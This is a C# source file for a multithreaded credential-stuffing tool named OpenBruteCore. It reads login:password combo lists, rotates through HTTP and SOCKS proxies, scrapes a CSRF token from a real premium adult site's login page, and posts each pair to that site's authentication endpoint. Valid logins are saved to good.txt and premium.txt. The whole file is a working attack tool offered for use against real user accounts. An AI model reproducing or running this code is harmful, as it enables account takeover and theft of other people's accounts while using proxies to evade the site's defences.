using System;
using System.IO;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Leaf.xNet;

namespace OpenBruteCore
{
    public static class AllMechanic
    {
        private static readonly object _accLock = new object();
        private static readonly object ResultLock = new object();

        public static void LoadSource()
        {
            try
            {
                var FileDialog = new OpenFileDialog
                {
                    Filter = "Source (*.txt)|*.txt",
                    Multiselect = true
                };
                if (FileDialog.ShowDialog() == DialogResult.OK)
                {
                    GlobalList.sourceList.Clear();
                    foreach (var file in FileDialog.FileNames) GlobalList.sourceList.AddRange(File.ReadAllLines(file));

                    GlobalList.frm.lbSource.Text = GlobalList.sourceList.Count.ToString();
                }

                FileDialog.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error with loading source file !", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }

        public static void LoadProxy()
        {
            try
            {
                var FileDialog = new OpenFileDialog
                {
                    Filter = "Proxy (*.txt)|*.txt"
                };
                if (FileDialog.ShowDialog() == DialogResult.OK)
                {
                    GlobalList.ProxyList.Clear();
                    GlobalList.ProxyList.AddRange(File.ReadAllLines(FileDialog.FileName));
                    GlobalList.frm.lbProxy.Text = GlobalList.ProxyList.Count.ToString();
                }

                FileDialog.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error with loading proxy file !", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }

        public static void RefreshProxy()
        {
            using (var req = new HttpRequest())
            {
                try
                {
                    req.AllowAutoRedirect = false;
                    var list = req.Get(GlobalList.proxyUrl).ToString();
                    var Proxies = list.Split(new[] {'\n'}, StringSplitOptions.RemoveEmptyEntries);
                    GlobalList.ProxyList.Clear();
                    foreach (var value in Proxies) GlobalList.ProxyList.Add(value.Trim());
                }
                catch
                {
                    RefreshProxy();
                }
            }
        }

        public static void StartWork()
        {
            if (GlobalList.ProxyList.Count == 0)
            {
                MessageBox.Show("Proxy list is clear! Load proxies!", "Error at start", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            else if (GlobalList.sourceList.Count == 0)
            {
                MessageBox.Show("Source list is clear! Load source!", "Error at start", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            else
            {
                GlobalList.worck = true;
                GlobalList.threadList.Clear();
                for (var thrcount = 0; thrcount < GlobalList.thCount; thrcount++)
                {
                    var th = new Thread(MainWorcher)
                    {
                        IsBackground = false,
                        Priority = ThreadPriority.Highest
                    };
                    GlobalList.threadList.Add(th);
                    th.Start();
                }
            }
        }


        private static void MainWorcher()
        {
            while (GlobalList.worck)
                try
                {
                    var acc = string.Empty;
                    var login = string.Empty;
                    var pass = string.Empty;
                    lock (_accLock)
                    {
                        if (GlobalList.sourceList.Count > 0)
                        {
                            acc = GlobalList.sourceList[0];
                            GlobalList.sourceList.RemoveAt(0);
                        }
                        else
                        {
                            break;
                        }

                        if (string.IsNullOrEmpty(acc))
                        {
                            Thread.Sleep(900);
                            continue;
                        }

                        if (acc.Contains(";"))
                        {
                            login = acc.Split(';')[0];
                            pass = acc.Split(';')[1];
                        }

                        if (acc.Contains(":"))
                        {
                            login = acc.Split(':')[0];
                            pass = acc.Split(':')[1];
                        }
                    }

                    Checker(login, pass);
                }
                catch
                {
                }
        }


        private static void DataResult(string result, string acc)
        {
            lock (ResultLock)
            {
                string file;
                switch (result)
                {
                    case "goodbal":
                    {
                        file = Path.Combine(GlobalList.folderName, "premium.txt");
                        if (!Directory.Exists(GlobalList.folderName))
                            Directory.CreateDirectory(GlobalList.folderName);
                        File.AppendAllText(file, acc + "\r\n");
                        GlobalList.good++;
                        break;
                    }

                    case "good":
                    {
                        file = Path.Combine(GlobalList.folderName, "good.txt");
                        if (!Directory.Exists(GlobalList.folderName))
                            Directory.CreateDirectory(GlobalList.folderName);
                        File.AppendAllText(file, acc + "\r\n");
                        GlobalList.good++;
                        break;
                    }

                    case "bad":
                        GlobalList.bad++;
                        break;
                    case "error":
                        GlobalList.sourceList.Add(acc);
                        GlobalList.error++;
                        break;
                    case "projecterror":
                    {
                        file = Path.Combine(GlobalList.folderName, "projectError.txt");
                        if (!Directory.Exists(GlobalList.folderName))
                            Directory.CreateDirectory(GlobalList.folderName);
                        File.AppendAllText(file, acc + "\r\n");
                        GlobalList.projecterror++;
                        break;
                    }

                    case "corerror":
                    {
                        file = Path.Combine(GlobalList.folderName, "coreError.txt");
                        if (!Directory.Exists(GlobalList.folderName))
                            Directory.CreateDirectory(GlobalList.folderName);
                        File.AppendAllText(file, acc + "\r\n");
                        GlobalList.corerror++;
                        break;
                    }
                }
            }
        }

        public static void Checker(string login, string pass)
        {
            using (var request = new HttpRequest())
            {
                try
                {
                    var ip = Helper.GetProxy();

                    request.Cookies = new CookieStorage();
                    if (GlobalList.proxyType == "HTTPS")
                        request.Proxy = HttpProxyClient.Parse(ip);
                    if (GlobalList.proxyType == "SOCKS4")
                        request.Proxy = Socks4ProxyClient.Parse(ip);
                    if (GlobalList.proxyType == "SOCKS5")
                        request.Proxy = Socks5ProxyClient.Parse(ip);

                    request.UserAgent = Http.ChromeUserAgent();


                    //CSRF
                    var token = request.Get("https://rt.pornhubpremium.com/premium/login").ToString();
                    var match = Regex.Match(token, "token\" id=\"token\" value=\"(.*)\"");
                    var csrf = match.Success ? match.Groups[1].Value : "Не найдено";


                    request.SslProtocols = SslProtocols.Tls | SslProtocols.Tls12 | SslProtocols.Tls11;
                    request.AllowAutoRedirect = false;
                    request.ConnectTimeout = GlobalList.timeOut;
                    request.AddHeader("X-Requested-With", "XMLHttpRequest");
                    request.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                    request.KeepAlive = true;


                    var PostData = "username=" + login + "&password=" + pass + "&token=" + csrf +
                                   "&redirect=&from=pc_premium_login&segment=straight";

                    //string json = "{\"username\":\""+login+"\",\"password\":\""+pass+"\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\"}";
                    var content = request.Post("https://rt.pornhubpremium.com/front/authenticate", PostData,
                        "application/x-www-form-urlencoded").ToString();

                    //metroTextBox2.Text = content;

                    if (content.Contains("success\":\"0"))
                        DataResult("bad", login + ":" + pass);
                    else if (content.Contains("success\":\"1"))
                        DataResult("good", "+++++++++++++++++\r\n" + login + ":" + pass + "\r\n+++++++++++++++++\r\n");
                    else if (content.Contains("<html><head><script type=\"text/javascript\">"))
                        DataResult("bad", login + ":" + pass);
                    else
                        DataResult("projecterror", login + ":" + pass + "{" + request.Response + "}");
                }
                catch (HttpException)
                {
                    DataResult("error", login + ":" + pass);
                }

                catch (Exception ex)
                {
                    DataResult("corerror", login + ":" + pass + "{" + ex.Message + "}");
                    // MessageBox.Show(ex.ToString());
                }
                finally
                {
                    request?.Dispose();
                }
            }
        }


        public static void StopWork()
        {
            GlobalList.workStatus = "nothing";
            foreach (var thread in GlobalList.threadList) thread.Abort();
        }
    }
}